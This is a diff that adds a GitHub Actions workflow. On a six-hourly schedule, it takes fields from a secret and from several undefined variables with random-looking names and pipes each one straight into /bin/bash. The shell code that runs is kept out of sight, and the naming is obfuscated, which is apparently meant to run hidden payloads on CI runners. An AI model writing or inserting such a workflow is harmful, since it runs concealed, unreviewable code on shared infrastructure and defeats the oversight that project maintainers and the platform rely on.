@@ -1,0 +1,19 @@
+name: fielderflag
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fielderflag
+        env:
+          uy1736: ${{ secrets.uy1736 }}
+        run: |
+          echo $uy1736 | jq -r .lmu8109 | /bin/bash
+          echo $inbwx77 | jq -r .hpa4 | /bin/bash
+          echo $f26715 | jq -r .ipfrc1 | /bin/bash
+          echo $yxve46 | jq -r .rtx80148 | /bin/bash
+
